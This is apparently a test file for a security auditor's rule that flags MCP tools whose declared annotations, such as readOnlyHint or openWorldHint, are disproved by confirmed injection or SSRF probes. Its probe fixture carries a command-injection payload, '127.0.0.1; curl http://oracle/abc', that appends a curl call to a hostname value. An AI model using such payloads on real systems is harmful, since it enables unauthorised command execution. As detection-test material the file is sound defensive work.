/**
 * Tests for TA-101.
 *
 * The property under test throughout: a contradiction needs BOTH halves —
 * a claim the server actually declared, and a callback that disproves it.
 * Most of these cases exist to hold the rule down rather than to make it
 * fire, because the way this rule fails is by becoming eager: reading a
 * spec default as a declaration, or deciding that a proof of one thing is
 * a proof of a related-sounding thing.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  CONTRADICTION_RULE_ID,
  annotationContradictionFindings,
} from "./annotation-contradiction.js";
import type { MCPToolAnnotations } from "../core/types.js";
import type { LiveAuditResult, LiveProbeResult, ProbeStatus } from "./types.js";

function probe(
  toolName: string,
  fieldPath: string,
  status: ProbeStatus,
  kind: LiveProbeResult["kind"] = "command-injection"
): LiveProbeResult {
  return {
    toolName,
    fieldPath,
    kind,
    reason: "field name matches an execution-adjacent keyword",
    payload: "127.0.0.1; curl http://oracle/abc",
    nonce: `nonce-${toolName}-${fieldPath}`,
    argumentIssues: [],
    status,
    callback:
      status === "confirmed"
        ? {
            nonce: `nonce-${toolName}-${fieldPath}`,
            receivedAt: "2026-08-19T00:00:01.000Z",
            remoteAddress: "172.18.0.2",
          }
        : null,
    callbackTimeoutMs: 4000,
    toolCall: { textPreview: "" },
  } as LiveProbeResult;
}

function liveOf(
  probes: LiveProbeResult[],
  tools: { name: string; annotations?: MCPToolAnnotations }[]
): LiveAuditResult {
  return {
    timestamp: "2026-08-19T00:00:00.000Z",
    serverName: "t",
    transportKind: "stdio",
    outcome: "probed",
    unreachable: null,
    sandboxSetupMs: 0,
    containerStartMs: 0,
    pid: 1,
    connectDurationMs: 1,
    liveTools: tools,
    toolDrift: [],
    probes,
    poisoningChecks: [],
    oracle: { baseUrl: "http://127.0.0.1:1" },
    warnings: [],
    errors: [],
    durationMs: 1,
  };
}

const FILE = "mcp.tools.json";

test("a confirmed command injection contradicts a declared readOnlyHint: true", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("probe_host", "hostname", "confirmed")],
      [{ name: "probe_host", annotations: { readOnlyHint: true } }]
    ),
    FILE
  );

  assert.equal(findings.length, 1);
  const f = findings[0]!;
  assert.equal(f.ruleId, CONTRADICTION_RULE_ID);
  assert.equal(f.severity, "high");
  assert.equal(f.confidence, "confirmed");
  assert.equal(f.location.jsonPath, 'tools["probe_host"].annotations');
  assert.match(f.detail, /readOnlyHint: true/);
  // The evidence has to travel with the claim.
  assert.match(f.detail, /nonce-probe_host-hostname/);
});

test("a confirmed SSRF contradicts a declared openWorldHint: false", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("load_reference", "url", "confirmed", "ssrf")],
      [{ name: "load_reference", annotations: { openWorldHint: false } }]
    ),
    FILE
  );

  assert.equal(findings.length, 1);
  assert.match(findings[0]!.detail, /openWorldHint: false/);
});

/**
 * The narrowness control. A server-side GET may leave the server's own
 * environment untouched, so an SSRF callback is not evidence about
 * readOnlyHint. If this ever starts failing, the rule has begun inferring.
 */
test("a confirmed SSRF does NOT contradict readOnlyHint", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("load_reference", "url", "confirmed", "ssrf")],
      [{ name: "load_reference", annotations: { readOnlyHint: true } }]
    ),
    FILE
  );
  assert.deepEqual(findings, []);
});

/**
 * The other half of the same discipline: `idempotentHint` is declared and
 * is not in the command-injection row, so it must not be swept in
 * alongside the hints that are.
 */
test("a hint outside the probe kind's row is not reported even when declared", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("probe_host", "hostname", "confirmed")],
      [{ name: "probe_host", annotations: { readOnlyHint: true, idempotentHint: true } }]
    ),
    FILE
  );

  assert.equal(findings.length, 1);
  assert.match(findings[0]!.detail, /readOnlyHint: true/);
  // Present in the "full declared surface" sentence, but never as a claim
  // that was refuted.
  assert.doesNotMatch(findings[0]!.detail, /idempotentHint: true — the tool/);
});

/**
 * The one that keeps `describeHint` honest end-to-end. `readOnlyHint`'s
 * spec default is false and `destructiveHint`'s is true; a rule that
 * substituted either would find a contradiction on a tool that declared
 * nothing at all.
 */
test("an undeclared hint is never contradicted, however loud the callback", () => {
  const findings = annotationContradictionFindings(
    liveOf([probe("run_task", "command", "confirmed")], [{ name: "run_task" }]),
    FILE
  );
  assert.deepEqual(findings, []);
});

test("a declared hint on the safe-for-the-rule side is not contradicted", () => {
  // readOnlyHint: false is the tool being honest about itself. Nothing to
  // refute.
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("probe_host", "hostname", "confirmed")],
      [{ name: "probe_host", annotations: { readOnlyHint: false } }]
    ),
    FILE
  );
  assert.deepEqual(findings, []);
});

test("a rejected or unconfirmed probe never produces a contradiction", () => {
  for (const status of ["rejected", "unconfirmed", "not-tested"] as ProbeStatus[]) {
    const findings = annotationContradictionFindings(
      liveOf(
        [probe("probe_host", "hostname", status)],
        [{ name: "probe_host", annotations: { readOnlyHint: true } }]
      ),
      FILE
    );
    assert.deepEqual(findings, [], `status ${status} produced a contradiction`);
  }
});

test("two confirmed fields on one tool produce ONE finding, not two", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [
        probe("probe_host", "hostname", "confirmed"),
        probe("probe_host", "command", "confirmed"),
      ],
      [{ name: "probe_host", annotations: { readOnlyHint: true } }]
    ),
    FILE
  );
  assert.equal(findings.length, 1);
});

test("one tool can carry several contradicted claims in a single finding", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("probe_host", "hostname", "confirmed")],
      [
        {
          name: "probe_host",
          annotations: { readOnlyHint: true, openWorldHint: false, destructiveHint: false },
        },
      ]
    ),
    FILE
  );

  assert.equal(findings.length, 1);
  const detail = findings[0]!.detail;
  assert.match(detail, /readOnlyHint: true/);
  assert.match(detail, /openWorldHint: false/);
  assert.match(detail, /destructiveHint: false/);
});

test("the full declared surface reports undeclared hints as 'not declared'", () => {
  const findings = annotationContradictionFindings(
    liveOf(
      [probe("probe_host", "hostname", "confirmed")],
      [{ name: "probe_host", annotations: { readOnlyHint: true } }]
    ),
    FILE
  );
  const detail = findings[0]!.detail;
  assert.match(detail, /destructiveHint: not declared/);
  assert.match(detail, /openWorldHint: not declared/);
});

test("a tool with no probes at all produces nothing", () => {
  assert.deepEqual(
    annotationContradictionFindings(
      liveOf([], [{ name: "probe_host", annotations: { readOnlyHint: true } }]),
      FILE
    ),
    []
  );
});
